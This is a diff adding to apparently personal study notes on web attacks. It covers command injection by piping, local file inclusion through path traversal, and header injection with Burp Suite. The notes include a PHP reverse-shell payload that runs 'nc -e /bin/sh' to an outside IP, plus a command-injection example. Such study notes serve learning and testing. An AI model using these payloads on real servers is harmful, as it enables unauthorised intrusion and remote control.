@@ -41,4 +41,34 @@ __Prevenntion__
 
 - Sometimes the semicolon does not work, piping __|__ might work work to separate the commands __EX: https:www.//site.com/index.php | ls__
 
-- 
+### Local File Inclusion:
+
+-  is an exploit that allows attacker to browser any file on the server
+
+- Discovering type of vulnerability would be trhough browsing or spidering the web application, EX: www.ste.com/?page=iclude.php
+
+  The URL shows that there a page is begining called with the paging URl == __?page=inlcude.php__
+
+- Exploiting this vulnerability would be through going back into the root directory and look for important files 
+
+- It is important to note that having many path traversal won't affect the validity of the url :
+
+  For example : if the path to the root directory is 3 ../../../ path traversal , putting 5 won't effect the vaility of the path, you can still access the root directory. Therefore, always include more ../ to ensure getting to the root directory
+  
+  
+__Advanced Technique for LFI __
+
+- In advanced techniques for LFI, a tampering the head of the request is one of the essential thigs.
+
+- User-agents, language and Accept can be modified through BurpSuite include the required shell commnads
+
+__Ex: <?phpinfo();?> __ 
+
+- __Shell Example:__ 
+
+__<?passthru('nc -e /bin/sh 10.25.26.74 6666');?>__
+
+- The above shell exploited the local innlusion vulnerability and use it to get access to the whole application 
+
+
+
